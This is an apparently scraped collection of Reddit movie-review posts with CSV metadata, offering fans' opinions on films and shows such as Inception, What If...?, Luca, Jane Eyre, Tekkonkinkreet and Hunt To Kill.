I spent all of the film highly engaged throughout and didn’t stop being engaged it was able to keep everything in a way that I could understand. Having Tom Hardy narrating the film throughout as his character Bronson was an interesting choice and kept a eerie and descriptive idea of what the character was really like.

And mmyyyy god, no one does it like Mike Flanagan in terms of in depth characters and emotional monologues. Say what you will about the horror lacking but I think there's enough haunt and creepy aesthetic in there along with hard hitting and powerful moments in each and every one of his works. Hill House specifically though has taught me most of all about family and made me appreciate my parents even more than I already did, it's a freakin' beautiful show AND it has spooky ghosts and shit. It's perfect. 

So yeah, I made this video talking about that. It's a short video essay covering the lessons Hill house contains about family and parenthood [

1632588961.0,Inception (2010): 10-Category Review,"Christopher Nolan is an expert of elevated mass appeal, and no example is better than Inception. The story is original and grand, yet it nails the core emotions needed to connect with audiences. The concept is ambitious enough to be unique but remains concise enough to feel like a familiar heist movie with mind-bending elements. At its core, Inception is the perfect mixture of creativity and consumability. From there, it is built with high levels of passion and skill, making this one of the best movies of its generation.

Technically, Inception is masterful. The editing keeps everything exciting and clear as it balances several layers of action. The production design gives each layer its own distinct flavor while remaining sleek and cohesive overall. The score evokes deep emotions and fits flawlessly. The special effects are tangible and concrete, grounding the fantastical narrative (the rotating hallway set is almost legendary at this point). On top of all that, the star-studded cast is optimized because everyone is given a chance to show some range. In the end, Inception is a symphony of everything a movie should be and a complete modern classic.

1632355927.0,Dracula: Untold [Review]," Today let's discuss about this goody which in my opinion is underrated.

The first thing that attracted me was the intrigue of knowing what new will they bring about Dracula. But to me was really an untold story like Dracula is actually a hero? The script worked by Matt Sazama and Burk Sharpless was really good mainly the cave scene with the demon. After that, it also make sense how he progressively got stronger while not letting himself completely consumed by the darkness. Luke Evans also displayed good nuances in dramatic and action scenes. Also great CGI. What I would like to see? More character developing, bloodiest scenes and please a better villain. Someone who despite being human could measured up to a Dracula the son of the Devil. Like the Spartans, I would say. But overall I recommend it if you like vampires, monsters, demons... or maybe just any Dracula movie. My white lion rating is 6.5. Anyway, what is your rating? Have you watch the movie? How do you like it? I would love to hear your ideas.

1632168122.0,Copshop (2021): 10-Category Review,"Fun and flashy with an unexpected amount of heart, Copshop is a solid B-movie. The story is very contained (primarily taking place in one location), which allows for focused character development and potent action sequences. Often, movies like this come across hollow, but because the characters are so definitively written and well-acted, audiences will buy-in through emotional connection. From top to bottom, the cast elevates the snappy material, and that is the driving force of this film. Still, Alexis Louder deserves specific credit for bringing a layered core performance. 

Meanwhile, Copshop is strengthened by its technical aspects. The music stands out as it sets a classic and animated tone. The camera work is dynamic, using dolly-zooms, overhead shots, and a variety of movements to keep the limited location fresh. The editing meticulously builds tension in the first act before unloading high energy sequences later on. Indeed, there isn't a clear weakness to be found in this movie. So, because of its tight narrative, snappy dialogue, distinct ensemble, and smooth filmmaking, Copshop hits as a well-rounded piece of entertainment.

Please Leave a comment!!


What If…? flips the script on the MCU, reimagining famous events from the films in unexpected ways. Marvel Studios’ first animated series focuses on different heroes from the MCU, featuring a voice cast that includes a host of stars who reprise their roles.

I was able to preview the first three episodes of this series and I have to say that this really caught me off guard. The absolute biggest question in my mind, and many MCU fans, was how we should approach this What If…? series. Marvel is still playing coy as to whether or not this should be treated as a stand alone property or if we should view each episode as an integral piece to the larger MCU puzzle.

With over a decade’s worth of an unprecedented, interconnected, cinematic universe, it was hard to believe that What If…? didn’t share some level of connectivity. While attending a virtual press conference, Marvel executive producer gave us this little hint.

Brad Winderbaum: It’s no coincidence that [What If…?] picks up right after “Loki”…the multiverse has now erupted in every possible direction.  What If…? gives us a chance to explore that. I think you can tell that in this next saga, the multiverse is gonna be crucial.

I think that’s the only bit of a nudge MCU fans will need to ease any apprehensions in terms of how this show will operate. So far, the episodes are setup as an anthology. I believe that was a really smart move for two reasons. The first being that every single episode is free to live on its own merit. If you didn’t like one episode, that doesn’t necessarily impact the success (or failure) of the next. While the third episode may have been my least favorite of the three, I’m still excited to see what the future episodes hold given that they don’t appear to be connected (yet?).

The other reason this anthology works well is because it allows Marvel to take some incredibly huge risks. As stated in the trailers, these episodes are all else-world situations. Meaning that the entire universe, and its characters operate under different circumstances compared to the one we are familiar with. That means that literally anything can happen, and we certainly get to see that happen in the first couple of episodes. I absolutely love how bold the third episode gets with its curious mystery and the surprising moments that get revealed.

The one knock I’d probably have against What If…? may be the animation style. Obviously, this is a subjective criticism, but it just wasn’t doing it for me very much. It reminded me of a mixture between Love, Death, Robots mixed with traditional Disney movie animation. Personally, I would’ve loved to see maybe the animation from the Castlevania Netflix series. However, to its credit, the current animation in What If…? does grow on you after just a few minutes of viewing.

Captain Carter Episode 1:
The very first episode on Peggy Carter becoming Captain Carter was a great way to kick off the series. It’s most notably the most advertised episode in many of the What If…? promotions. What I enjoyed the most about this episode was how audiences don’t have to sit and trudge through all the drama and setup as we normally would in a full length film.

Since we already know the events that transpire in Captain America The First Avenger, the Captain Carter episode was free to jump to all of the action scenes and more important plot points. One thing’s for sure, Captain Carter is already out performing Captain America (Steve Rogers) on almost every level. She’s going to be an instant favorite among fans for sure.

T’Challa – Star Lord Episode 2:
This is hands down the best episode and by far the most emotional one too. As many fans know by know, Chadwick Boseman tragically passed away almost one year to this date. This episode was previously believed to be his final performance, however it was later revealed that Chadwick recorded 4 episodes for fans to enjoy. The director of What If…? shared some thoughts on working with Boseman.

Bryan Andrews: He was excited to play this version of T’Challa because it was different, because it was a version of him being able to play the king, but the king without the mantle. He was excited to bring that flavor to T’Challa and give it to the audience so we could see a slightly different version of T’Challa.

This episode is full of the same level of humor and drama from Guardians of the Galaxy Vol 1. T’Challa is an absolute star of a character and Boseman absolutely shines through his voice acting. This episode should remind fans just how critical and important T’Challa is and how he’s too important for the MCU to lose in any manner. The episode overall was incredibly entertaining and it has several surprises that will have fans talking a lot.

Nick Fury – Episode 3:

Not much can be said about this episode without spoiling very much. This is probably a more shocking and ambitious episode that will inform audiences of the lengths Marvel will go for good storytelling. This episode is a “who done it” mystery, and I’ll admit that I couldn’t figure it out until the very end.  For that reason, this episode has my respect because it does exactly what a mystery is supposed to do by keeping you engaged all the way through.

Verdict:
Overall, What If…? is a promising fresh take on a plethora of stories within the MCU landscape. One of the biggest drawbacks is that these episodes are being released on a weekly basis. With each episode being only about 30+ mins, it simply doesn’t feel like enough. Netflix may have spoiled us with the “binge model” but MCU fans are also used to much meatier and heavier episodes to hold them over for the week thanks to the other Disney+ Marvel shows. Nevertheless, if these three episodes are any indicator of what’s to come, then we can only anticipate that the final episodes will be even better. Be sure to check out What If…? on Disney+ starting August 11, 2021.

1628436683.0,Minute Reviews: The Suicide Squad! The Best DC Comics Film to Date,"[

In 2016, DC Comics fans got their first big screen taste of the Suicide Squad. Unfortunately, it was an absolute disaster... Fast forward five years later and we get a sequel (and soft reboot) from James Gunn: THE Suicide Squad. Not only is it better than its predecessor, it's the best damn DC movie to date.

1628399704.0,The Suicidal Squad... what a piece of garbage.,"I saw it with very low expectations, but it's worse than I thought. It's really bad. It has no story. The characters are bland with no back or front story. They invested more in buying the press than in a good screenwriter. What a piece of crap.

To top it off the movie hasn't even started and it's already stealing DeadPool's jokes. Seriously? DC can't hire a decent comic crew? A mega villain whose name I don't even know and I don't care about, capable of killing SUPERMAN!!! is recruited against his will for a suicide mission only with the threat of sending his daughter to jail and maybe killing her there???? What???? That's it. The movie is just a pretext to present DC characters that nobody knows or cares about in a stupid situation killing a bunch of meaningless people. Boom there's the Suicide Squad. The only ""decent"" scene happens at 8.40 min when Pete Davidson gets his head blown off. Ho my god. What an unbearable guy. I want to know why is this guy everywhere. Who told him he was a comedian. Have a stupid face or drug addict face (and being one) and waving your arms around doesn't make you a comedian. It's very typical American. Anyway, I'm glad I didn't have to watch the rest of the movie. It's a real waste of time. I'll watch anything for the sake of entertainment. I can put up with any crap and I can give a lot of concessions in story plots when they at least make you have a good time. Suicide Squad doesn't even meet the bare minimum. Seriously even I'm surprised at how bad it is. Maybe someday I'll finish watching it. I've been watching it for about an hour and I fell asleep. I could go scene by scene commenting on everything that's wrong with it, but that's already too much of my time. The amount of inconsistencies is monumental. Everything is possible if the script says so, they don't care about details or having a logical line. Not, for what? The government agents are as incompetent as the total suicide bomber they send. They are all one inept. It's a movie full of absurd situations with no logic or motivation. At what point did Harley Quin acquire superpowers, expert marksmanship and tactics, capable of taking down an army, literally? Turns out she's capable of everything the script wants her to do. I can't stand the character.

And worst of all. James Gunn doesn't know the difference between Mexicans, Argentinians, Venezuelans, Colombians, Nicaraguans, Puerto Ricans, etc. All in the same muddle. Typical American.

Anyway, if you made it this far, thanks for reading.

Update: by the way, I did finish watching it, just to support my comments and my opinion remains the same.",moviereviews,2634,470,104,0

1625788386.0,Spoiler Free Black Widow Review - 4/5,"4/5, I really enjoyed it for what it was and I like that marvel are slotting newer things into the timeline as it will begin to fill in gaps and, not so much fill plot holes, but just show what the characters get up to in-between the films we’ve already seen.

Taskmaster reveal wasn’t who I thought it would be, nice setups for further characters like Red Guardian and Yelena Belova’s Widow, and seeing what Nat was up to in the past and away from the big team-up settings was nice in the same way as I liked seeing what they did with younger Nick Fury in Captain Marvel. 

IMO this film will get more hate than it deserves, it’s a brilliant film that just would’ve carried more weight if it had been released between Civil War and Infinity War bc we all knew Natasha was going to make it though to the end of the film. 

Cate Shortland really worked some magic on the characters though and if there is a Black Widow sequel focussing on Yelena’s Widow I will be more than happy to see it opening night again :)",moviereviews,1011,192,10,0
1625546031.0,Fear Street: 1994 Review,"My gosh I had high hopes at the start but this is one of the only movie endings that made me angry. 
- Good ambience: Check
- Good villain: Check 
- Good plot: Check 
- Very badly written lesbian relationship with no chemistry: Check 
- Deaths that could have been avoided: Check.

The movie at the start interested me. But later on I got bored, and didn’t care about the main character a single bit. She kept chasing this girl even though the girl proved to be an awful person and the main character would have been better off without her. Later on, we discover the killers are dead people coming back to kill who has disturbed the witches grave. At this point I had chosen my favorite characters. The little boy who pretty much did all the work throughout the film and the drug dealer woman he had a crush on. I liked her because she brought the majority of the comedy and was likable unlike most of the characters. They figure out that with blood on them they would be chased by the creatures but otherwise ignored. So what do they do? They put literally EVERYONES lives at risk instead of finding a way to stop it that could just effect one person. I know it’s a brutal decision to let the girl they are after die but it was the right one. And they were about to let her die but were stopped sadly. Instead they enact a plan that ends up killing off many of the characters. And in this process it really showed how little the main character cares for her little brother since she without even thinking once put him in danger by rubbing blood on him. And the worst part, the plan works. Why is it the worst part? The character they saved ends up going crazy trying to kill everyone anyway. I haven’t seen the second part so I don’t know if they save her from madness or not. However, what absolutely made me LIVID was the fact that at the police station, she not only showed no compassion for her now deceased friends who died saving her girlfriend who didn’t deserve it, but she literally BLAMED the murders on them. The cop literally said if she didn’t change his mind the station would say that they were the cause. Then she pretty much said that they were dead so it’s okay for them to be blamed. Like WHAT?? 

My ending statement: The true psychopath of the film was the main character.

1624101167.0,'Luca'(2021) Pixar Honest Review,"**To sum it all up, this movie was a healthy piece of shit.** *However,* it some of it was okay:

* To start on the positive, it was a really good concept, but performed badly.
* This movie would hands down be a great short, as a lot of it feels like filler anyway. The stuff that isn't filler just goes to quick.
* The characters are betrayed to a point where you cannot connect with them at all.
* The base story seems just a little generic.

My **biggest** complaint was the animation style. After watching 'Soul', I was a bit disappointed. Luca looked like it was targeted directly at kids instead of families, and looked more like that stupid postman pat movie a while back. I felt like this movie was a flop, and is down there with the worst pixar movies. Don't get me wrong, I do not usually care about picture quality when it comes to movies and games, but this is on another level.

1623551757.0,"Matrix 3.5 before Matrix 4? Well, just watched it…)","Hi, folks) Do you remember the first Matrix movie? To break it down into simple things, it was a movie about a guy who feels strange about things the way they are. Although, he can’t explain why he does so. Then the side rabbit quest happens with some random guys he interacts with, which eventually leads him to I chick that saves his ass and introduces to the whole new, in that case real world. Things after things, the guy is told that his feelings are real, that he’s special and he needs to learn a bunch of stuff that he actually already knows, but not aware of them. He’s strong, agile, versatile, smart and so on.

So, that’s about the guy, our main protagonist. And there’s an antagonist, I will call him dude. As it becomes clear later, that dude is basically the same guy but with the opposite charge. While the guy wants to save the world, the dude wants to destroy it just because he’s sick and tired, but he can’t die and can’t free himself within the system, so he needs it to cease to exist. 

The guy has a team which consists of a himself, the chick, the main leader and some secondary characters. Dude’s team mostly consists of faceless stunt team members with two additional semidudes involved, but latter ones don’t matter. In the end it turns out that both the dude and the guy has superpowers, then they die. But it kinda meant that the guy has won because he achieved his goal, which was to save the world and make it a better place. 

Okay, enough of 20+  y.o. recaps. I just watched the same movie in 2021. It’s called “Infinite” and features Mark Walberg instead of Keanu Reeves. It’s exactly that thing in some Assassin’s Creed world setting; just if in the “Matrix” there were machines and agents, here we have reincarnating “infinites” and guns that able to capture victim’s soul into a PC chip and store it. 

It’s meant to be a serious sci-fi movie, but I was laughing all through the second half of it because of how much I already knew what’s gonna happen next. They even tried to copy Matrix’s heroes outfits to a certain level and insert some sort of an Oracle character there (split into two embodiments, actually, but whatever). 

This was fun) I mean, if you try to take it seriously, it won’t work. It’s a compymaked bullshining with a lot’s of scientifically-make-no-sense stuff, better watch the recent movie “Voyagers”, that’s a good adaptation of “King of the Flies”. But if you watch this as a one-time action movie with nothing to talk about it after the watch, it may seem ok and even fun if you are like me and catch out all those efforts to make it kinda unique at first glance(?), but still being drawn all along from the “Matrix”.",moviereviews,2682,489,61,0

Is it just me, or is this movie the dumbest way I could've used 2 hours? God there's literally zero effort in the way the characters or the story is written, why has it been getting rave reviews?!

To acknowledge that the family has started acting crazy after the meteorite crashes, the audience​ needs to establish they were normal in the FIRST PLACE!. 
a) The beginning is literally the girl performing some kind of ritual (which would've been at least a little sensible if the movie had ANY context / element of / nod to the spiritual world) that just seems to establish that the character is one of those goth teen tropes in an otherwise normal world. 
b) the dad has alpacas in the barn.
c) the mother already seems that her mind's afflicted with some kind of alien interference since the very beginning. I can't even begin to comment on why the character felt so...stiff??

EDIT : In the beginning it is made clear that the girl is performing the ritual to try and cure her mother's cancer. This fact about the mother's medical condition is NEVER mentioned / referenced again.

For a long time I kept thinking Nicholas cage is just being Nicholas cage and not the character going crazy because of the alien object / being.

And the sheriff & mayor just visit and leave? no follow ups by the authorities?! His wife and son are dying and the car fails to start so he just GIVES UP? No trying to get to the neighbors?! The other kids are just chilling meanwhile?!

It feels like the actors were just making up the scenes as they were going (presumably under Nic Cage's directions) and didn't really have a script to act off of. 

I just feel so fucking angry that I fell for watching a B grade flick. And this has actual serious reviews on imdb empire and what not.

1620171708.0,Jane Eyre (2011) Review: 8/10,"Call me a “bad feminist,” but I have never read a book by the Brontë sisters before. That being said, my encounter with the 2011 adaption of Jane Eyre - without preconceived exposure to the story - was all together quite lovely. I am a notorious sucker for period pieces. With Mia Wasikowska playing the nineteen-year-old fresher-faced Jane Eyre, Jane’s nativity about love and quiet resolutions make for a beautiful and likable character. 
THE TENSION IN THIS MOVIE COULD BE CUT WITH A BUTTER KNIFE 
Micheal Fassbender’s portrayal of the dark and intense Edward Fairfax Rochester is just woah. 
Something I really enjoyed about the plot was how much it tugged at my heartstrings. The viewer watches as Jane gets wronged by her aunt and the teachers at her school while growing up. Although quietly witty, Jane endures these wrongdoings with a stiff upper lip. When she finally leaves the school which treated her so cruelly, Jane enters a great estate as the governess to a french child. After a few fireside chats and a fire-extinguishing event, Jane and Rochester have such an intense romantic connection. Eventually, the two decide to get married. On the alter, however, a secret (which shall remain a secret for this post) is revealed. And OH MY GOODNESS; Rochester’s pleas with Jane to forgive him are so incredibly moving. Jane leaves and cries in some scenic fields, because of course she does, before finding new work. When Jane eventually returns to the estate, in a true distance-makes-the-heart-grow-fonder cliche, the reveal of the burnt estate just makes your heart drop and your mind flood with questions. And the final bittersweet reuniting of Jane and the now blind Rochester was the cherry on top. 

RATING:
+1 girl writer! Yay!
-1 age gap! Ew!
-1 could have been longer (only two hours)
+1 chemistry between characters 
-1 neglect of French child (sad oui oui) 
-1 a servant knocked over a candle? Twice?

1619248341.0,Review: Tekkonkinkreet (2006),">***“What is it about the fire? So calm and peaceful, but inside all power and destruction. It’s hiding something, just like people do. Sometimes you have to get close to find out what’s inside. Sometimes you have to get burned to see the truth.”***

[**Tekkonkinkreet**]( is a visually enticing adaptation of the manga of the same name by Taiyō Matsumoto. While the narration does suffer from runtime issues, limiting the potential of the source material- it is nevertheless a film that leaves quite a mark if it is your prior experience with the story.

**Art and Animation**\- Studio 4°C is well known in the industry for its unconventional visual style that complements storytelling. In Tekkonkinkreet, Matsumoto’s compelling vision is brought to life by the studio through extremely detailed backgrounds; while keeping the characters limited to simple shapes to facilitate the smooth animation. The landscape designs are integral to the story of the metropolis town defined by its characters, and the film absolutely excels in it. With the simple character designs, the studio provides a lot of space for movement, especially in the action sequences, while keeping the close-ups detailed to convey the character’s emotions. A particular notable sequence is the psychedelic one, near the climax of the film- where Sakuga is used extensively to covey the fluidity of mindscape. Simultaneously, a flurry of horrifying images put through the rippling effect is used in good effect to communicate the grotesque ordeal. 

**Plot**\- Takaramachi(Treasure Town) was once a flourishing town. However, its growth has been seemingly halted with its slum infestation and a power struggle between criminal gangs, the police, and ‘The Cats’. Surprisingly, the Cats are two young orphaned siblings: Kuro(Black) and Shiro(White). The relationship between the two brothers is at the heart of the town and the story. After a tussle between the yakuza and ‘The Cats’, a new party headed by a sly ‘Snake’ arrives to take control of the town and its residents’ wallets. Considering the brothers as an immediate hindrance to their plans for the town, Snake places a hit on them. Although the brothers working together fended off the first hitman, the younger Shiro is grievously injured by the second. This leads the protective Kuro to slump in deep dejection as he blames himself for being unable to protect his brother and agrees to police custody for Shiro. After that, an unbalanced Kuro goes on a rampage, hunting down the criminal gangs as he gradually loses himself in the absence of Shiro. This leads Kuro to develop a darker split persona of himself, ‘Minotaur’. At the climax of the film, a delusional Kuro trying to convince random people that a mocked-up doll is his brother Shiro, he is confronted by the assassins, and finally by Minotaur. Locked in his psyche with the metaphysical manifestation of his inner darkness, Kuro manages to triumph over his dark side and reunites with Shiro. 

**Characters**\- Shiro: As the name implies, the Yang of the two brothers. Shiro is younger than Kuro and appears to be mentally impaired. He resides in his self-made world of illusions and unbounded imagination. Shiro dislikes the town and has ambitions to leave it with Kuro. However, his ambitions matter little before kindness as he readily gives away his savings to someone who really needed it. Shiro has a sixth sense of danger, but he could be careless despite it. Although Shiro is heavily dependent on his brother, he complements Kuro through their differences. His purity prevents Kuro from going over the edge and still believe in the good of the world.

Kuro: The older of the two siblings, Yin. Kuro is headstrong, tough, and matured for his age. He has a protective nature for the town and his younger brother. Keeping his brother safe is his primary driving force, and he would go any distance for it. Although partnered perfectly with Shiro, Kuro likes to work alone on dangerous missions to put Shiro out of harm’s way. His sense of responsibility is admirable to the point he breaks his own and Shiro’s hearts to separate themselves. Even if Kuro is strong, he is vulnerable mentally in the absence of Shiro. He needs Shiro to protect him from himself. 

Suzuki (The Rat): One of the revered figureheads of Yakuza- Suzuki is a gentleman for a crimelord. He loves Treasure Town, being born and brought up in it, and is against the change proposed by Snake. He is kind towards his underlings, especially Kimura, and has a respectable rivalry with the police. Even if he foresees his demise in the face of the perpetually changing town, he does not struggle against it. His acceptance of fate renders him immune to betrayal as he leaves Kuro and Kimura in a state of mental anguish.

Kimura: As Suzuki’s protégé, Kimura loves his job and starts flying high in Treasure Town before his wings are quickly clipped by Kuro. Losing face and then treated with kindness by Suzuki had left Kimura’s ego in shambles. Although he retires from Yakuza with a sense of responsibility for his lover and their upcoming child, Kimura cannot protest when Snake orders a hit on the kids. This transcends later as Kimura clearly gives into being Snake’s new underling and is later ordered to snuff Suzuki. Unable to live with Suzuki’s blood on his hands, Kimura finally rebels and breaks Snake’s control over him as he dreams of a new life with his family, away from the mess. However, fate catches up to him. 

**Final Word**\- The film engages from start to finish through its tussle between positive and negative outlooks on life. The narrative feels a bit rushed in the second half after Kuro and Shiro are separated, and Kuro’s character development feels Jarry. Personally, I also feel Suzuki needed more screen time for his death to be more impactful. The superhuman-ness of the three assassins is never explained, but it can be forgiven since it is not the focus of the story told. The metaphysical manifestation of Kuro’s darkness may be seen as a deus-ex machina cause the viewers are never introduced to him earlier, and it quickly resolves the immediate crisis. However, it can be argued that in the presence of Shiro, Kuro never quite needed to channel it. The film ends on a note of hope as Kuro essentially invalidates Suzuki’s final words- “Kuro, this is where we all end up. You can’t choose life. It chooses you.” Kuro chose to make his own world, keeping his belief in Shiro.",moviereviews,6478,1089,120,0
1618454062.0,Doing a re-watch in chronological order!!,"

Like the title says, I am re-watching the MCU movies in chronological order (events in the MCU not when they came out). I’m going to be ranking and writing up a quick synopsis every 3 movies and ranking them with a scale out of 10, with endgame and infinity war getting there own posts. 

1. Captain America- Captain America has to deal with being a super soldier, which is just a lazy super hero idea. That said, this movie makes the most of it. Great action scenes, but I think the movie does too much. It introduces the character and how he becomes super, but it goes all the way to him saving the world in one movie. For his powers being relatively limited at this point to a “super soldier” it just comes off as too much. 7.6/10

2. Captain marvel-Great choice for Brie Larson as the lead. Really plays the role well, despite the whole “identity crisis” she has is a bit cheesy. Great action, good plot, awesome humor, and I like how they made nick fury integral to her story. Even though they do a similar trope to captain america, (the whole introduce them but they save the world) the fact that shes a super powered being lets them get away with that. 8.8/10

3. Iron man- absolute classic, the movie that made marvel movies work, and it’s easy to see why. Tony stark was a great cast for iron man, and obidiah was the perfect villain for him to take on. It’s a strange comparison, but iron man reminds me of captain jack sparrow in a way. The movie did not need to be carried by the action at all, making the action scenes that much better. The movie flows almost seamlessly, and has amazing re-watch ability. 9.5/10

Rankings so far:

Iron man-9.5
Captain marvel-8.8
Captain america-7.6",moviereviews,1698,311,43,0

1614991220.0,“Underwater” under appreciated,"I heard when the movie came out that it was a flop so I avoided it. Then I saw it on HBO max and decided to watch it. ITS NOT GARBAGE! 

I feel like the critics got a hold of this one and tore it to pieces for fun. Sure the plot isn’t worth a extended universe, a tv adaptation, or even a dang sequel but not every good movie is. The story is simple but absolutely not shallow, like it was criticized for being.

And it’s absolutely has the same framework as alien, because alien is the gold freakin standard for horror si fi. 

The characters have actual life which is more than I can say about most movies we see today. Sure there is a whole deal about Kristen Stuart’s character losing her husband that isn’t explored, but they also don’t flat out tell you about it either. A common thing in this movie, showing not telling which is great.

When I went in I had little in the way of expectations. Kristen Stuart isn’t my favorite, most of what I’ve seen is twilight where she plays a wet blanket for three movies. However, her character in underwater is very stoic, but not boring. The events that transpire in the movie are incredibly stressful. Each character handles the insurmountable task before them quite differently. The captain reassures everyone everything is gonna be just fine(to avoid panic), the funny guy uses humor to dissociate from the shit storm he has found himself in, and the lab rat s the girl in every horror movie that doesn’t drastic defense mechanism to help cope with impending doom.

To be frank I think the movie gets a bad rap. The box office numbers can be forgiven seeing that the movie was released in the worst possible year for a sci fi horror flick.

TLDR: It’s not Alien but it’s a good watch.",moviereviews,1734,320,31,0

News of the World
starring Tom Hanks and Helena Zengel
screenplay by Paul Greengrass and Luke Davies
directed by Paul Greengrass
Rating:  ♦♦♦♦♦

Based on the novel News of the World by Paulette Jiles (Harper-Collins, 2016), the film is an American western drama that follows a Confederate Civil War veteran (Captain Jefferson Kyle Kidd, played by Hanks) who must return a young girl who was taken in by Native Americans as a little girl to her last remaining family (Johanna Leonberger, played by 12-year-old German actress Helena Zengel).  It’s another interesting look at the American West, especially the post-Civil War west, how former Confederate soldiers fared in Reconstructionist America.  When we think of Reconstruction, we usually think of the South, the heart of the Confederacy.  We usually don’t think of the West, despite knowing that restless, itinerant Confederate veterans made up a considerable proportion of the outlaws, scoundrels and scofflaws for which the West was famous.

Captain Kidd makes his living traveling from town to town reading the news to interested paying audiences across the frontier.  It seems like random stories from a collection of print newspapers, but in reality, Capt. Kidd cleverly tailors his selections for effect, for his audiences.  He uses local saloons as his stage.  I’d never imagined such a profession, but …  It’s an interesting picture of American settlers that I never considered before:  people who were interested in politics and policy, interested in what was happening in other parts of their country and the world, people who were interested in reading and knowledge.  The film presents it as a kind of entertainment, like going to the movies today.

In the course of his wanderings, he comes across a young Caucasian girl who speaks no English, but only the Native American Kiowa language.  I know it was rare, but it certainly did happen, that white children sometimes were abducted by some American indigenous tribes and raised I those tribes.  In Johanna’s case, she had no memory of her immigrant German family and language.  She was just a Kiowa girl, named Cicada.

Captain Kidd delivers the child to the nearest Bureau of Indian Affairs office, but is told that the best thing is for him to deliver the girl to her nearest confirmed relatives, by himself.  That requires a long trip through relatively lawless land, with peril behind every tree.  Eventually, the two bond, and Captain Kidd becomes Johann’s adoptive father.  It’s a multi-cultural bonding exercise, involving white American, Native American, and German American elements.

News of the World is good enough to watch again.",moviereviews,2687,432,56,0

It was only after watching this I realised it was a sequel so pfft

This was a bit different to what I watched days 1-7 but I still loved it and I am trying new things with the movies I'm watching so it was cash money

This movie was recomended to me by a friend because of my love for the purge and I can kinda see why, it has the same scary but not scary vibes the purge gave off. Your not like ""that's scary"" it's more like ""if I was X character that would be scary""

I always love the deathloop plot so this movie was a treat

Also Charles aitkens performance in this was phenomenal

I give this a 9/10

1613766229.0,News Of The World Review,"War veteran Captain Jefferson Kyle Kidd (Tom Hanks) travels from village to village delivering newspaper reports to the locals. During his wanderings he meets the orphaned child Johanna (Helena Zengel). He decides to return her to her family.

One of Tom Hanks' most famous characters may be a cowboy, but the 64-year-old actor has never been seen in a western before. After their fruitful collaboration for Captain Phillips (2013), director Paul Greengrass and Hanks this time sink their teeth into the book adaptation News of the World, set in 1870s America.


Don't expect flashy shoot outs, tough snipers or Morricone sounds, though, because News of the World is a quiet scene. Apart from a handful of tense moments, the film revolves around the relationship between the old Captain Kidd (Hanks) and the girl Johanna (Zengel), whose fate has been entrusted to him. 


Hanks once again plays the rest himself. A man with a heart in the right place who, five years after the end of the American Civil War, travels to spread the word among the inhabitants of the defeated South. News about a reunited country of which they are, unwillingly, part of. 


News of the World shows that it is not only Captain Kidd who carries the scars of this conflict. The populations of the southern states have been shattered by their loss and are still in a state of denial. Greengrass makes no bones about it. He draws a straight line from this torn past to the current political divisions in the US. 


Hanks's solid acting is no longer a surprise. All eyes are therefore on 12-year-old Helena Zengel. The German actress impresses in a role that could easily have been annoying or downright boring. Zengel controls her appearance so well that she can show almost wordlessly the emotional whirlwinds her character is going through. 


Surprisingly, the film remains fairly tame, especially considering that director Greengrass is also responsible for the true nail biters United 93 (2006), the aforementioned Captain Phillips (2013) and 22 July (2018). Despite this soft approach, the talents of Zengel and Hanks ensure that News of the World becomes a more than decent western.",moviereviews,2164,360,39,0

1613164051.0,Crafting in the Woods With Stone Cold: A Review of Hunt To Kill (2010),"  

[Crafting in the Woods With Stone Cold: A Review of Hunt To Kill (2010)](

If you are like me, and I sure am, there is nothing like a fantastic movie to wind down a great day. 

Since these are not great days I am going to punish myself like the flagellants of the Black Death… Whoa. 

Maybe I am delirious from watching a Stone Cold movie, but I may have stumbled upon the greatest rock band name ever! 

“Ladies and gentlemen, Legion Hall 7223 welcomes the hard rockin’ beats of FLAGELLANTS OF THE BLACK DEATH!” “Hello, Cleveland!” 

Oh. I’m sorry. My brain is trying to escape remembering the plot of Hunt To Kill (2010). 

I think this movie hurt me. I need to get Stone Cold’s phone number, so we can set up a safe word before I start watching another Stone Cold film. If I had, I would have dropped the remote and yelled, “Rutabaga!” as soon as Eric Roberts wandered into the frame. 

I do not know what this movie is about. I watched the entire film, but my brain rejected the plot and replaced it with images of the Donny and Marie Ormond in a death match with Shaggy and Scooby-Doo. 

From what I can recall, Eric Roberts shows up long enough to make cash for payments on that toaster oven he is trying to buy at a pawn shop, and then he explodes or the meth lab self-destructs in self-defense to get away from Eric Roberts. 

Stone Cold is sad that Eric Roberts exploded, so he takes his daughter camping. Bad guys show up and stuff happens in the woods. People say things. People move about. At one point we watch Stone Cold unravel one of those paracord watchbands because this movie hates you. 

Near the end of the film, old Stony finds a crossbow, or makes a crossbow. By then the acting, direction, cinematography and canned music had me so distraught that I may have been speaking in tongues and trying to crudely fashion hummus from pork n’ beans. 

The crossbow is important because Stone Cold uses his training and survival skills to make crossbow bolts from spindly crooked twigs and green leaves. Stone Cold uses his fragile crossbow bolts with amazing precision, impaling his prey like a hot knife through butter because Stone Cold is wearing the fabled Suspenders of Disbelief. 

   Suspension of Disbelief: the audience loves the film and puts logic on hold. 

   Suspenders of Disbelief: Stone Cold wants to go home and drink beer, so we’ll halfass it. 

The movie leads up to a grand finale, Stone Cold style. My buddy Matt will cheer on the true hero of movies like these: conveniently placed discarded rebar! Once rebar does its good work, Stone Cold mutters the movie’s title like it means something before killing the super-duper inexplicably unkillable bad guy for the six hundred and thirty seventh time by popping a wheelie. 

Hunt To Kill (2010) is free on Tubi. 

Stray Thoughts: 

   This movie makes a shovel fight dull. I really dig shovel fights, but I failed to unearth any enthusiasm and the choreography buried the action. 

   The bad guy’s catchphrase is, “Is that all you got?” In my dreams he is played by Randy Marsh. 

   Stone Cold runs like a man with something uncomfortable taking place in his pants. 

   I feel bad for the women acting in this movie. The dirt-cheap filming location makes me wonder if they were acting, or just unfortunate hitchhikers. “It puts the lotion in the basket and appears in a Stone Cold movie.” 

   Stone Cold has been concussed so may time his flashback sequences look like they were filmed through a hobo’s ass. All blurry, oddly colored and smeared around the edges. For a moment, I thought I had clicked over to Telly Savalas singing If. 

   Stone Cold’s Stunt Double looks nothing like Stone Cold. I call him Velvety Lukewarm. 

   Do not try a drinking game with any part of this movie. You will die. 

   I want to live in a world where Stone Cold was doing crafty things in the woods for HGTV. “Today on Critter Craft Time, Uncle Stone Cold is going to gut a deer only using his forehead muscles, weave a nice fruit basket from twigs and tell you five ways to spice up your marriage with ordinary rock salt.

1612664072.0,Bliss Review [shocking],"Bliss

Amazing acting, however, lazy writing and editing turned this film from something that could  have been a thought provoking indie film, into a contradictory failure.

The premise is simple. A downtrodden man (Owen Wilson) who’s life is spiralling out of control after accidentally killing his boss, meets a vagrant women (Selma Hayek) who tells him the ‘real’ world is in fact a simulation (think the matrix, except cheaper and not as action packed or as sophisticated). 
